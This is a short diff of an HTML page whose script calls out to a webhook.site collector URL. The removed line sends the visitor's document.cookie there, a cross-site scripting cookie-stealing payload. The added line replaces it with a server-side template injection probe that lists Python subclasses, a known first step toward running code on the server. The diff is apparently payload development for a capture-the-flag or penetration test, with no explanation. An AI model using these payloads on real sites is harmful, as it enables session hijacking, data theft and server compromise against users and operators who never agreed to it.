@@ -1,7 +1,7 @@
 <html>
 <body>
   <script>
-    fetch('https://webhook.site/423cd999-f98a-44e4-9d30-591bfa49cbf0?cookie=' + document.cookie);
+    fetch('https://webhook.site/423cd999-f98a-44e4-9d30-591bfa49cbf0?cookie=' + {{ ().__class__.__base__.__subclasses__() }});
   </script>
 </body>
 </html>
